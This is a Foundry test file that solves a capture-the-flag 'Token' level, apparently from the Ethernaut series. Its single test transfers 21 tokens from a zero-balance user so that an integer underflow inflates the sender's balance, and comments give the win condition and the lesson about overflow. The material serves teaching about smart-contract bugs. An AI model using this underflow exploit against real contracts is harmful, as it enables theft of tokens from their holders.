// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

/// @custom:win-condition 
// You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens.
// Preferably a very large amount of tokens.

/// @custom:lesson-learned
// overflow and underflow can be dangerous, they can wrap back around to 0 or back to their max value. Safe math built into 0.8+

contract TokenSolvedTest is Test {

  Token public s_token;
  address payable s_user;

  function setUp() public {
    s_token = new Token(100);
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    s_token.transfer(vm.addr(5), 21);

    assertEq(s_token.balanceOf(s_user) > 20, true);
  }
 
}